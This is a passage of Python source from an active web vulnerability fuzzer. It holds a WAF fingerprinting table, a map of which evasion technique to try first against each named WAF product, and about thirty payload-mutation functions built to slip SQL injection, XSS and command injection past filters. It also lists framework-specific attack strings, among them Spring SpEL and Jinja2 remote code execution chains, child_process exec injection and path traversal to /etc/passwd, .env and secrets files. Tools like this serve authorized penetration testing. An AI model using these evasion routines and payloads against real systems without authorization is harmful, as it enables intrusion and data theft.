        ("GCP Cloud Armor",  None,          None,        r"Google Cloud Armor|Forbidden.*GCP"),
        ("Fastly WAF",       "x-served-by", r"cache-",   r"Fastly error|Request blocked"),
        ("Radware AppWall", "server",        r"Radware",             r"Radware|Request Blocked.*Unauthorized"),
        ("Citrix NetScaler", None,           None,                   r"ns_af.*=|NetScaler|Citrix ADC"),
        ("Edgecast/Verizon", "server",       r"ECS|ECAcc|Verizon",  r"Request blocked|Verizon Digital Media"),
        ("Signal Sciences",  "x-sigsci-tags", r".+",                 None),
        ("DataDome",         "set-cookie",   r"datadome",            r"DataDome|Please verify you are a human"),
        ("PerimeterX/HUMAN", None,           None,                   r"Please verify|human challenge|px-captcha"),
        ("Vercel Firewall",  "x-vercel-id",  r".+",                  r"BLOCKED.*Vercel|This request has been blocked"),
        ("Alibaba Cloud WAF","server",       r"Tengine",             r"errors\\.aliyun\\.com|Blocked by Web Application Firewall"),
    ]

    # ── WAF-specific bypass strategy ordering ───────────────────────────────
    # Maps WAF name → ordered list of strategy method names to try FIRST
    WAF_BYPASS_MAP: dict[str, list[str]] = {
        "Cloudflare":   ["unicode_normalize", "double_encode", "html_entity_encode", "whitespace_substitute"],
        "ModSecurity":  ["comment_inject", "case_variation", "concat_split", "whitespace_substitute"],
        "AWS WAF":      ["double_encode", "unicode_normalize", "hex_encode", "backslash_escape"],
        "Imperva":      ["unicode_normalize", "html_entity_encode", "case_variation", "null_byte_insert"],
        "Akamai":       ["double_encode", "whitespace_substitute", "comment_inject", "hex_encode"],
        "F5 BIG-IP":    ["url_encode", "case_variation", "concat_split", "comment_inject"],
        "Sucuri":       ["backslash_escape", "unicode_normalize", "double_encode", "whitespace_substitute"],
        "Barracuda":    ["case_variation", "comment_inject", "url_encode", "double_encode"],
        "Fortinet":     ["hex_encode", "unicode_normalize", "double_encode", "case_variation"],
        "Wallarm":      ["concat_split", "whitespace_substitute", "backslash_escape", "double_encode"],
        "Wordfence":    ["unicode_normalize", "double_encode", "comment_inject", "html_entity_encode"],
        "Azure Front Door": ["double_encode", "unicode_normalize", "utf8_overlong", "hex_encode"],
        "GCP Cloud Armor":  ["unicode_normalize", "case_variation", "comment_inject", "utf8_overlong"],
        "Fastly WAF":       ["double_encode", "whitespace_substitute", "hex_encode", "backslash_escape"],
        "Comodo":           ["case_variation", "url_encode", "comment_inject", "double_encode"],
        "DenyAll":          ["unicode_normalize", "hex_encode", "whitespace_substitute", "case_variation"],
        "Radware AppWall":   ["double_encode", "case_variation", "null_byte_insert", "comment_inject"],
        "Citrix NetScaler":  ["url_encode", "whitespace_substitute", "case_variation", "backslash_escape"],
        "Edgecast/Verizon":  ["unicode_normalize", "double_encode", "hex_encode", "case_variation"],
        "Signal Sciences":   ["utf8_overlong", "unicode_nfkc", "mixed_encode", "whitespace_substitute"],
        "DataDome":          ["unicode_nfkc", "mixed_encode", "triple_encode", "utf8_overlong"],
        "PerimeterX/HUMAN":  ["unicode_normalize", "double_encode", "case_variation", "hex_encode"],
        "Vercel Firewall":   ["unicode_normalize", "double_encode", "case_variation", "utf8_overlong"],
        "Alibaba Cloud WAF": ["unicode_normalize", "double_encode", "comment_inject", "hex_encode"],
    }

    # ── Context-aware mutation: vuln type → best strategies ─────────────────
    VULN_MUTATION_MAP: dict[str, list[str]] = {
        "sqli":   ["comment_inject", "case_variation", "concat_split", "whitespace_substitute", "hex_encode",
                    "mysql_version_comment", "non_recursive_replace", "scientific_notation", "space2dash", "randomcomments",
                    "apostrophe_mask", "symbolic_logical", "between_equals"],
        "xss":    ["html_entity_encode", "unicode_normalize", "case_variation", "null_byte_insert", "octal_encode",
                    "js_charcode", "non_recursive_replace", "utf8_overlong", "base64_encode"],
        "cmdi":   ["backslash_escape", "whitespace_substitute", "concat_split", "hex_encode", "null_byte_insert",
                    "non_recursive_replace", "space2hash"],
        "lfi":    ["double_encode", "null_byte_insert", "url_encode", "backslash_escape", "unicode_normalize",
                    "utf8_overlong", "triple_encode", "unicode_nfkc"],
        "ssti":   ["unicode_normalize", "url_encode", "double_encode", "hex_encode", "html_entity_encode",
                    "utf8_overlong"],
        "ssrf":   ["double_encode", "url_encode", "hex_encode", "unicode_normalize", "backslash_escape",
                    "utf8_overlong", "param_pollution", "unicode_nfkc"],
    }

    @classmethod
    def identify_waf(cls, status_code: int, headers: dict, body: str) -> str | None:
        """Identify specific WAF product from response characteristics.
        Returns WAF name or None if unknown."""
        headers_lower = {k.lower(): v for k, v in headers.items()}
        body_sample = body[:4000]

        for waf_name, hdr_key, hdr_pattern, body_pattern in cls.WAF_FINGERPRINTS:
            # Check header match
            hdr_match = False
            if hdr_key and hdr_pattern:
                hdr_val = headers_lower.get(hdr_key, "")
                if hdr_val and re.search(hdr_pattern, hdr_val, re.I):
                    hdr_match = True
            elif hdr_key:
                hdr_match = hdr_key in headers_lower

            # Check body match
            body_match = False
            if body_pattern:
                if re.search(body_pattern, body_sample, re.I):
                    body_match = True

            # Match if either criterion is met (and at least one exists)
            if hdr_match or body_match:
                return waf_name

        return None

    # WAF block detection patterns
    WAF_SIGNATURES = [
        re.compile(r"(?i)access\s*denied|forbidden", re.I),
        re.compile(r"(?i)cloudflare|cf-ray", re.I),
        re.compile(r"(?i)mod_security|NOYB", re.I),
        re.compile(r"(?i)request\s*blocked|web\s*application\s*firewall", re.I),
        re.compile(r"(?i)aws\s*waf|imperva|incapsula", re.I),
        re.compile(r"(?i)barracuda|fortiweb|wallarm|sucuri", re.I),
        re.compile(r"(?i)azure\s*front\s*door|x-azure-ref"),
        re.compile(r"(?i)cloud\s*armor|google\s*frontend"),
        re.compile(r"(?i)datadome|human\s*verification"),
        re.compile(r"(?i)perimeterx|px-captcha|HUMAN\s*Security"),
        re.compile(r"(?i)radware|appwall"),
        re.compile(r"(?i)netscaler|citrix\s*adc"),
        re.compile(r"(?i)Tengine.*blocked|aliyun"),
    ]

    WAF_STATUS_CODES = {403, 406, 429, 418, 444, 503, 521, 522, 523}

    @staticmethod
    def is_waf_blocked(status_code: int, body: str) -> bool:
        """Detect if response indicates WAF blocking.
        Requires BOTH suspicious status code AND body signature for 403/406
        to avoid false positives on legitimate forbidden responses.
        429 (rate limit) and 418 (I'm a teapot) are standalone indicators."""
        body_sample = body[:2000]
        has_waf_sig = any(sig.search(body_sample) for sig in PayloadMutator.WAF_SIGNATURES)

        # 429/418 are strong WAF indicators on their own
        if status_code in (429, 418):
            return True
        # 403/406/444/503/521-523 require body signature confirmation
        if status_code in (403, 406, 444, 503, 521, 522, 523) and has_waf_sig:
            return True
        # Body signature alone (any status code) still counts
        if has_waf_sig:
            return True
        return False

    @staticmethod
    def url_encode(payload: str) -> str:
        """Single URL encoding."""
        from urllib.parse import quote
        return quote(payload, safe="")

    @staticmethod
    def double_encode(payload: str) -> str:
        """Double URL encoding — encode the percent signs too."""
        from urllib.parse import quote
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def unicode_normalize(payload: str) -> str:
        """Replace ASCII with Unicode fullwidth equivalents for WAF bypass."""
        mapping = {
            "'": "\uff07", '"': "\uff02", "<": "\uff1c", ">": "\uff1e",
            "(": "\uff08", ")": "\uff09", "/": "\uff0f", "\\": "\uff3c",
            "=": "\uff1d", ";": "\uff1b", "|": "\uff5c", "&": "\uff06",
        }
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def null_byte_insert(payload: str) -> str:
        """Insert null bytes between keyword characters to bypass pattern matching."""
        # Insert %00 after first 3 chars of SQL/HTML keywords
        import re as _re
        def _insert(m):
            word = m.group(0)
            if len(word) > 3:
                return word[:2] + "%00" + word[2:]
            return word
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|script|alert|onerror)\b", _insert, payload)

    @staticmethod
    def case_variation(payload: str) -> str:
        """Randomize case of SQL/HTML keywords."""
        import re as _re
        def _vary(m):
            word = m.group(0)
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR|script|alert|onerror|onload|img|svg)\b", _vary, payload)

    @staticmethod
    def comment_inject(payload: str) -> str:
        """Inject inline comments into SQL keywords (SEL/**/ECT)."""
        import re as _re
        def _split(m):
            word = m.group(0)
            mid = len(word) // 2
            return word[:mid] + "/**/" + word[mid:]
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR)\b", _split, payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Convert special characters to hex encoding (%XX)."""
        result = []
        for c in payload:
            if c in "'\"<>()=;|&/ ":
                result.append(f"%{ord(c):02x}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def octal_encode(payload: str) -> str:
        """Convert characters to HTML octal/decimal entity encoding."""
        result = []
        for c in payload:
            if c in "'\"<>()=;":
                result.append(f"&#{ord(c)};")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """Convert to HTML hex entity encoding (&#xHH;)."""
        result = []
        for c in payload:
            if c in "'\"<>()=;/&":
                result.append(f"&#x{ord(c):02x};")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def concat_split(payload: str) -> str:
        """Split keywords using string concatenation (SQL: 'SEL'+'ECT', bash: 'c''a''t')."""
        import re as _re
        def _concat(m):
            word = m.group(0)
            mid = len(word) // 2
            return f"'{word[:mid]}'+'{word[mid:]}'"
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR)\b", _concat, payload)

    @staticmethod
    def whitespace_substitute(payload: str) -> str:
        """Replace spaces with alternative whitespace characters."""
        alternatives = ["\t", "\x0b", "\x0c", "\xa0", "/**/", "+", "%09", "%0a", "%0d"]
        alt = alternatives[hash(payload) % len(alternatives)]  # deterministic per payload
        return payload.replace(" ", alt)

    @staticmethod
    def backslash_escape(payload: str) -> str:
        """Insert backslash escapes into keywords for shell/SQL bypass."""
        import re as _re
        def _escape(m):
            word = m.group(0)
            if len(word) > 2:
                pos = len(word) // 2
                return word[:pos] + "\\" + word[pos:]
            return word
        return _re.sub(r"(?i)\b(SELECT|UNION|DELETE|FROM|WHERE|cat|ls|id|whoami|script|alert)\b", _escape, payload)

    @staticmethod
    def triple_encode(payload: str) -> str:
        """Triple URL encoding — for WAFs that decode twice but not thrice."""
        from urllib.parse import quote
        return quote(quote(quote(payload, safe=""), safe=""), safe="")

    @staticmethod
    def mixed_encode(payload: str) -> str:
        """Mixed encoding — hex-encode special chars then URL-encode the result."""
        hex_pass = []
        for c in payload:
            if c in "'\"<>()=;|& ":
                hex_pass.append(f"\\x{ord(c):02x}")
            else:
                hex_pass.append(c)
        from urllib.parse import quote
        return quote("".join(hex_pass), safe="")

    @staticmethod
    def utf8_overlong(payload: str) -> str:
        """UTF-8 overlong encoding — encode chars with more bytes than needed.
        Many WAFs only decode standard UTF-8, missing overlong forms."""
        # Overlong encode key chars: / = %c0%af, . = %c0%ae, < = %c0%bc, > = %c0%be
        mapping = {"/": "%c0%af", ".": "%c0%ae", "<": "%c0%bc", ">": "%c0%be",
                   "'": "%c0%a7", '"': "%c0%a2", "\\": "%c0%dc"}
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def mysql_version_comment(payload: str) -> str:
        """MySQL version-conditional comments — /*!50000 SELECT */ executes on MySQL 5+.
        WAFs often skip comment content."""
        import re as _re
        def _wrap(m):
            return f"/*!50000 {m.group(0)} */"
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR|DROP)\b", _wrap, payload)

    @staticmethod
    def non_recursive_replace(payload: str) -> str:
        """Exploit non-recursive WAF sanitization — if WAF strips 'SELECT' once,
        'SELSELECTECT' becomes 'SELECT' after strip."""
        import re as _re
        def _double(m):
            word = m.group(0)
            mid = len(word) // 2
            return word[:mid] + word + word[mid:]
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|SCRIPT|ALERT)\b", _double, payload)

    @staticmethod
    def scientific_notation(payload: str) -> str:
        """Replace integers in SQL payloads with scientific notation equivalents.
        1 becomes 1e0, 0 becomes 0e0 — confuses type-checking WAFs."""
        import re as _re
        def _sci(m):
            num = m.group(0)
            return f"{num}e0"
        return _re.sub(r"(?<=[=<>!])\s*(\d+)(?=\s|$|[);,])", _sci, payload)

    @staticmethod
    def json_sqli_wrap(payload: str) -> str:
        """Wrap SQL injection in JSON syntax — bypasses WAFs that don't parse JSON values.
        Example: 1 AND 1=1 → {"id": "1 AND 1=1"}"""
        return '{"inject":"' + payload.replace('"', '\\"') + '"}'

    @staticmethod
    def js_charcode(payload: str) -> str:
        """Convert XSS payloads to String.fromCharCode() form for WAF bypass."""
        # Only convert if it looks like an XSS payload
        if "<" in payload or "script" in payload.lower() or "alert" in payload.lower():
            codes = ",".join(str(ord(c)) for c in payload)
            return f"String.fromCharCode({codes})"
        return payload

    @staticmethod
    def param_pollution(payload: str) -> str:
        """HTTP Parameter Pollution — duplicate the parameter to confuse parsers.
        Many WAFs only inspect the first occurrence while backends use the last."""
        # This returns a modified payload; the actual HPP duplication happens at injection
        return f"harmless&inject={payload}"

    @staticmethod
    def space2dash(payload: str) -> str:
        """SQLMap tamper: space2dash — replace spaces with dash-dash-newline comments."""
        return payload.replace(" ", " --\n")

    @staticmethod
    def space2hash(payload: str) -> str:
        """SQLMap tamper: space2hash — replace spaces with pound-newline (MySQL)."""
        return payload.replace(" ", " #\n")

    @staticmethod
    def randomcomments(payload: str) -> str:
        """SQLMap tamper: randomcomments — insert random inline comments into SQL keywords."""
        import re as _re
        import random
        def _rand_comment(m):
            word = m.group(0)
            if len(word) <= 2:
                return word
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/**/" + word[pos:]
        return _re.sub(r"(?i)\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR|GROUP|ORDER|BY|HAVING|LIMIT)\b", _rand_comment, payload)

    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64-encode the payload — useful for eval(atob()) XSS and data URI bypasses."""
        import base64
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def apostrophe_mask(payload: str) -> str:
        """Replace apostrophes with UTF-8 fullwidth equivalent %EF%BC%87.
        SQLMap tamper: apostrophemask."""
        return payload.replace("'", "%EF%BC%87")

    @staticmethod
    def symbolic_logical(payload: str) -> str:
        """Replace SQL logical keywords with symbolic operators.
        SQLMap tamper: symboliclogical. AND→&& OR→||"""
        import re as _re
        result = _re.sub(r'\bAND\b', '&&', payload, flags=_re.I)
        result = _re.sub(r'\bOR\b', '||', result, flags=_re.I)
        return result

    @staticmethod
    def between_equals(payload: str) -> str:
        """Replace = with BETWEEN x AND x for WAF bypass.
        SQLMap tamper: between."""
        import re as _re
        def _between(m):
            # Match patterns like col=value
            return m.group(1) + " BETWEEN " + m.group(2) + " AND " + m.group(2)
        return _re.sub(r"(\w+)\s*=\s*(\w+)", _between, payload)

    @staticmethod
    def unicode_nfkc(payload: str) -> str:
        """NFKC normalization exploits — substitute chars that normalize to dangerous equivalents.
        Greek question mark → ;, one-dot leader → ., division slash → /"""
        mapping = {
            ";": "\u037e", ".": "\u2024", "/": "\u2215", "'": "\u02bc",
            '"': "\u201c", "-": "\u2010", "(": "\u207d", ")": "\u207e",
            "=": "\uff1d", "<": "\uff1c", ">": "\uff1e",
        }
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def percentage_encode(payload: str) -> str:
        """Prepend % before each char — ASP strips them, WAF doesn't.
        SQLMap tamper: percentage."""
        return "".join(f"%{c}" for c in payload)

    # All available mutation strategies (ordered)
    ALL_STRATEGIES: list[str] = [
        "case_variation", "comment_inject", "url_encode", "double_encode",
        "unicode_normalize", "null_byte_insert", "hex_encode", "octal_encode",
        "html_entity_encode", "concat_split", "whitespace_substitute", "backslash_escape",
        "triple_encode", "mixed_encode", "utf8_overlong", "mysql_version_comment",
        "non_recursive_replace", "scientific_notation", "json_sqli_wrap", "js_charcode",
        "param_pollution", "space2dash", "space2hash", "randomcomments",
        "base64_encode", "apostrophe_mask", "symbolic_logical",
        "between_equals", "unicode_nfkc", "percentage_encode",
    ]

    MAX_MUTATIONS = 20  # first 10 single, next 10 chained

    @classmethod
    def mutate(cls, payload: str, attempt: int, vuln_type: str | None = None,
               waf_name: str | None = None, preferred: list[int] | None = None) -> str:
        """Apply mutation strategy based on attempt, context, and WAF intelligence.

        Priority order:
        1. Previously successful strategies (preferred)
        2. WAF-specific strategies (if WAF identified)
        3. Vuln-type-specific strategies (context-aware)
        4. Default round-robin

        Attempts 0-9: single strategy. Attempts 10-19: chained (two strategies combined).
        """
        if payload is None:
            return ""
        strategy_names = cls._select_strategies(vuln_type, waf_name, preferred)

        if attempt < 10:
            # Single strategy
            idx = attempt % len(strategy_names)
            fn = getattr(cls, strategy_names[idx])
            return fn(payload)
        elif attempt < 20:
            # Chained: apply two strategies in sequence
            chain_idx = attempt - 10
            idx1 = chain_idx % len(strategy_names)
            idx2 = (chain_idx + 1) % len(strategy_names)
            fn1 = getattr(cls, strategy_names[idx1])
            fn2 = getattr(cls, strategy_names[idx2])
            return fn2(fn1(payload))
        else:
            # Attempts 20+: WAFDetector evasion corpus (8 variants per type)
            variants = cls.get_evasion_variants(payload, vuln_type)
            if variants:
                return variants[(attempt - 20) % len(variants)]
            # Fall back to chained strategies if WAFDetector unavailable
            chain_idx = (attempt - 20) % len(strategy_names)
            fn = getattr(cls, strategy_names[chain_idx])
            return fn(payload)

    @classmethod
    def chain_mutate(cls, payload: str, strategy_names: list[str]) -> str:
        """Apply multiple mutation strategies in sequence."""
        if payload is None:
            return ""
        result = payload
        for name in strategy_names:
            fn = getattr(cls, name, None)
            if fn:
                result = fn(result)
        return result

    @classmethod
    def mutate_for_context(cls, payload: str, vuln_type: str, attempt: int) -> str:
        """Context-aware mutation — select strategies appropriate for the vuln type."""
        if payload is None:
            return ""
        # Map vuln_type to category
        category = cls._vuln_category(vuln_type)
        strategies = cls.VULN_MUTATION_MAP.get(category, cls.ALL_STRATEGIES[:6])
        idx = attempt % len(strategies)
        fn = getattr(cls, strategies[idx])
        return fn(payload)

    @classmethod
    def _select_strategies(cls, vuln_type: str | None, waf_name: str | None,
                           preferred: list[int] | None) -> list[str]:
        """Build ordered strategy list based on intelligence."""
        # Start with preferred (previously successful)
        result: list[str] = []
        if preferred:
            for idx in preferred:
                if 0 <= idx < len(cls.ALL_STRATEGIES):
                    result.append(cls.ALL_STRATEGIES[idx])

        # Add WAF-specific strategies
        if waf_name and waf_name in cls.WAF_BYPASS_MAP:
            for s in cls.WAF_BYPASS_MAP[waf_name]:
                if s not in result:
                    result.append(s)

        # Add vuln-type-specific strategies
        if vuln_type:
            category = cls._vuln_category(vuln_type)
            for s in cls.VULN_MUTATION_MAP.get(category, []):
                if s not in result:
                    result.append(s)

        # Fill remaining with defaults
        for s in cls.ALL_STRATEGIES:
            if s not in result:
                result.append(s)

        return result

    @classmethod
    def get_evasion_variants(cls, payload: str, vuln_type: str | None = None) -> list[str]:
        """Return WAFDetector-sourced evasion variants for the given payload and vuln type.

        Bridges the gap between the WAFDetector evasion corpus (waf_detector.py) and
        the PayloadMutator strategy engine.  Lazy-imported to avoid circular dependencies.
        """
        try:
            from .waf_detector import WAFEvasionPayloads as _WAFEvasion  # lazy import
        except ImportError:
            return []
        vt = (vuln_type or "").lower()
        if "sqli" in vt or "sql" in vt or vt in ("nosql_injection", "xpath_injection", "ldap_injection"):
            return _WAFEvasion.get_sqli_evasion(payload)
        if "xss" in vt:
            return _WAFEvasion.get_xss_evasion(payload)
        return _WAFEvasion.get_generic_evasion(payload)

    @staticmethod
    def _vuln_category(vuln_type: str) -> str:
        """Map specific vuln type to mutation category."""
        if "sqli" in vuln_type or "sql" in vuln_type or vuln_type in ("nosql_injection", "xpath_injection", "ldap_injection"):
            return "sqli"
        if "xss" in vuln_type:
            return "xss"
        if vuln_type == "cmdi":
            return "cmdi"
        if vuln_type in ("lfi", "rfi", "path_traversal"):
            return "lfi"
        if vuln_type == "ssti" or vuln_type == "el_injection":
            return "ssti"
        if vuln_type == "ssrf":
            return "ssrf"
        return "sqli"  # default


# ── Technology-specific payloads based on fingerprint detection ────────────
FRAMEWORK_PAYLOADS: dict[str, list[tuple[str, str, str]]] = {
    # Each entry: (payload, vuln_type, description)
    "Django": [
        ("../../../settings.py", "lfi", "Django settings file disclosure"),
        ("{% debug %}", "ssti", "Django debug template tag"),
        ("{{settings.SECRET_KEY}}", "ssti", "Django SECRET_KEY leak via SSTI"),
        ("/__debug__/", "info_disclosure", "Django debug toolbar"),
        ("/admin/", "info_disclosure", "Django admin panel exposure"),
        ("{{request.META}}", "ssti", "Django request META leak"),
        ("/static/admin/", "info_disclosure", "Django admin static files"),
    ],
    "Spring": [
        ("/actuator/env", "info_disclosure", "Spring Boot Actuator env endpoint"),
        ("/actuator/health", "info_disclosure", "Spring Boot Actuator health"),
        ("/actuator/beans", "info_disclosure", "Spring Boot Actuator beans"),
        ("/actuator/configprops", "info_disclosure", "Spring Boot config properties"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "el_injection", "Spring SpEL RCE"),
        ("#{T(java.lang.Runtime).getRuntime().exec('id')}", "el_injection", "Spring SpEL RCE variant"),
        ("/env", "info_disclosure", "Spring legacy env endpoint"),
        ("/trace", "info_disclosure", "Spring legacy trace endpoint"),
        ("/heapdump", "info_disclosure", "Spring Actuator heap dump"),
        ("/jolokia", "info_disclosure", "Spring Jolokia JMX endpoint"),
    ],
    "Rails": [
        ("user[admin]=true", "mass_assignment", "Rails mass assignment — admin flag"),
        ("user[role]=admin", "mass_assignment", "Rails mass assignment — role escalation"),
        ("../../config/database.yml", "lfi", "Rails database config disclosure"),
        ("../../config/secrets.yml", "lfi", "Rails secrets config disclosure"),
        ("/rails/info/routes", "info_disclosure", "Rails route info page"),
        ("/rails/info/properties", "info_disclosure", "Rails properties page"),
        ("erb:<%= `id` %>", "ssti", "ERB template injection"),
        ("/assets/application.js", "info_disclosure", "Rails asset pipeline JS"),
    ],
    "Express": [
        ("__proto__[admin]=1", "prototype_pollution", "Express prototype pollution via query"),
        ("constructor[prototype][admin]=1", "prototype_pollution", "Express constructor pollution"),
        ("..\\..\\..\\..\\etc\\passwd", "lfi", "Express backslash path traversal"),
        ("....//....//....//etc/passwd", "lfi", "Express double-dot-slash traversal"),
        ("/graphql", "info_disclosure", "Express GraphQL endpoint"),
        ("/api-docs", "info_disclosure", "Express Swagger docs"),
        ("${require('child_process').exec('id')}", "ssti", "Express SSTI via template engine"),
    ],
    "Flask": [
        ("{{config.items()}}", "ssti", "Flask config leak via Jinja2 SSTI"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "ssti", "Flask Jinja2 RCE chain"),
        ("/console", "info_disclosure", "Flask Werkzeug debugger console"),
        ("{{request.environ}}", "ssti", "Flask environ leak via SSTI"),
        ("{{url_for.__globals__}}", "ssti", "Flask globals leak via url_for"),
    ],
    "FastAPI": [
        ("/docs", "info_disclosure", "FastAPI Swagger UI"),
        ("/redoc", "info_disclosure", "FastAPI ReDoc"),
        ("/openapi.json", "info_disclosure", "FastAPI OpenAPI spec"),
    ],
    "Laravel": [
        ("/../.env", "lfi", "Laravel .env file disclosure"),
        ("/telescope", "info_disclosure", "Laravel Telescope debug panel"),
        ("/_debugbar/open", "info_disclosure", "Laravel Debugbar"),
        ("/storage/logs/laravel.log", "lfi", "Laravel log file disclosure"),
        ("{{phpinfo()}}", "ssti", "Laravel Blade SSTI"),
    ],
    "WordPress": [
        ("/wp-config.php.bak", "info_disclosure", "WordPress config backup"),
        ("/wp-json/wp/v2/users", "info_disclosure", "WordPress user enumeration"),
        ("/xmlrpc.php", "info_disclosure", "WordPress XML-RPC enabled"),
        ("/?author=1", "info_disclosure", "WordPress author enumeration"),
        ("/wp-admin/install.php", "info_disclosure", "WordPress installer page"),
    ],
    "Next.js": [
        ("/_next/data/", "info_disclosure", "Next.js data routes"),
        ("/api/", "info_disclosure", "Next.js API routes"),
        ("/_error", "info_disclosure", "Next.js error page"),
    ],
}


@dataclass
class FuzzResult:
    url:              str
    method:           str
    param:            str
    param_type:       str
    payload:          str
    vuln_type:        str
    finding:          str
    severity:         str
    evidence_id:      Optional[str]          = None
    resp_time_ms:     float                  = 0.0
    baseline_time_ms: float                  = 0.0
    time_delta_ms:    float                  = 0.0
    status_code:      int                    = 0
    proof:            Optional[str]          = None
    proof_data:       Optional[str]          = None
    confidence_level: AuditIssueConfidence   = AuditIssueConfidence.TENTATIVE


class Fuzzer:
    """
    Active payload fuzzer. Takes input surfaces from Crawler.SiteMap
    and sends real attack payloads against each discovered parameter.
    """

    SEV_MAP = {
        "sqli_error":       "high",
        "sqli_union":       "critical",
        "sqli_bool_true":   "high",
        "sqli_bool_false":  "high",
        "sqli_blind_time":  "high",
        "xss_reflected":    "high",
        "xss_stored":         "high",
        "xss_second_order":   "high",
        "xss_blind":          "high",
        "lfi":              "critical",
        "cmdi":             "critical",
        "ssti":             "high",
        "ssrf":             "critical",
        "open_redirect":    "medium",
        "xxe":              "critical",
        "header_injection":      "medium",
        "crlf_injection":        "medium",
        "prototype_pollution":   "high",
        "exceptional_conditions": "medium",
        "idor":                  "high",
        "acl_bypass":            "high",
        "method_tamper":         "medium",
        "http_smuggling":        "high",
        "csrf":                  "high",
        "buffer_overflow":       "high",
        "xpath_injection":       "high",
        "ldap_injection":        "high",
        "nosql_injection":       "high",
        "hpp":                   "medium",
        "host_header":           "high",
        "deserialization":       "critical",
        "log4shell":             "critical",
        "el_injection":          "critical",
        "cache_poisoning":       "medium",
        "ssi_injection":         "high",
        "rfi":                   "critical",
        "format_string":         "high",
        "xml_injection":         "high",
        "latex_injection":       "medium",
        "css_injection":         "medium",
        "spring4shell":          "critical",
        "xslt_injection":        "high",
        "jwt_confusion":         "critical",
        "prototype_pollution_body": "high",
        "mass_assignment":       "high",
        "crypto_downgrade":      "high",
        "dangling_markup":       "medium",
        "csv_formula_injection": "medium",
    }

    # Which vuln types to run per param type
    PARAM_TYPE_MAP: dict[str, list[str]] = {
        "query":  ["sqli_error", "sqli_union", "sqli_bool_true", "sqli_blind_time", "xss_reflected", "lfi",
                   "cmdi", "ssti", "ssrf", "open_redirect", "idor", "xpath_injection",
                   "buffer_overflow", "ldap_injection", "nosql_injection", "el_injection",
                   "log4shell", "ssi_injection", "rfi", "format_string", "xml_injection",
                   "hpp", "exceptional_conditions", "crypto_downgrade",
                   "latex_injection", "css_injection", "spring4shell", "xslt_injection",
                   "dangling_markup", "xss_blind"],
        "form":   ["sqli_error", "sqli_union", "sqli_bool_true", "sqli_blind_time", "xss_reflected", "xss_stored",
                   "lfi", "cmdi", "ssti", "xxe", "open_redirect", "xpath_injection",
                   "buffer_overflow", "ldap_injection", "nosql_injection", "el_injection",
                   "log4shell", "deserialization", "ssi_injection", "rfi", "format_string",
                   "xml_injection", "hpp", "exceptional_conditions",
                   "mass_assignment", "prototype_pollution",
                   "latex_injection", "css_injection", "spring4shell", "xslt_injection",
                   "dangling_markup", "xss_blind", "xss_second_order"],
        "header": ["header_injection", "crlf_injection", "sqli_error", "buffer_overflow",
                   "log4shell", "el_injection", "ssi_injection", "cache_poisoning",
                   "xss_reflected", "ssti", "cmdi", "ssrf", "nosql_injection",
                   "jwt_confusion"],
        "path":   ["sqli_error", "sqli_union", "sqli_bool_true", "lfi", "idor", "buffer_overflow",
                   "el_injection", "ssi_injection", "rfi", "format_string",
                   "xss_reflected", "xss_stored", "nosql_injection", "cmdi", "ssti",
                   "xpath_injection", "ldap_injection", "ssrf", "open_redirect", "xxe"],
        "json":   ["sqli_error", "sqli_union", "sqli_bool_true", "xss_reflected", "xss_stored", "ssti", "xxe",
                   "xpath_injection", "nosql_injection", "deserialization", "el_injection",
                   "log4shell", "xml_injection", "exceptional_conditions",
                   "mass_assignment", "prototype_pollution", "prototype_pollution_body",
                   "xslt_injection", "spring4shell",
                   "jwt_confusion", "xss_blind",
                   "ssrf", "lfi", "cmdi", "rfi"],
        "cookie": ["sqli_error", "sqli_union", "sqli_bool_true", "sqli_blind_time", "xss_reflected", "buffer_overflow",
                   "log4shell", "format_string",
                   "nosql_injection", "ssti", "header_injection", "lfi",
                   "cmdi", "el_injection", "xpath_injection",
                   "jwt_confusion", "ssrf"],
        # ── Burp Suite Montoya AuditInsertionPointType additions ──────────
        #
        # URL_PATH_FILENAME: payload replaces the stem of the last URL
        # segment (e.g. /api/report.pdf → /api/<payload>.pdf).
        # Exercises LFI, path traversal, null-byte, IDOR, RFI, SSI, and
        # format-string bugs that live in filename-routing code paths.
        "path_filename": ["lfi", "rfi", "idor", "ssi_injection", "sqli_error",
                          "buffer_overflow", "nosql_injection", "el_injection",
                          "format_string", "xss_reflected", "cmdi", "ssti",
                          "xpath_injection", "ssrf"],
        #
        # REQUEST_LINE: payload appended as an extra path token after the
        # endpoint (e.g. GET /api/users/<payload>).  Exercises path-traversal,
        # routing bypass (Spring Boot actuator, Express wildcard), IDOR,
        # LFI, open-redirect, and host-header/cache-poisoning vectors.
        "request_line": ["lfi", "rfi", "idor", "open_redirect", "sqli_error",
                         "xss_reflected", "ssti", "buffer_overflow",
                         "el_injection", "ssi_injection", "format_string",
                         "nosql_injection", "cmdi", "ssrf", "xpath_injection"],
    }

    # ── Context-aware payload selection by parameter name semantics ───────
    # Each rule: (compiled_regex, [prioritized_vuln_types])
    # When a parameter name matches, these vuln types are tested FIRST,
    # followed by the remaining location-based types (deduplicated).
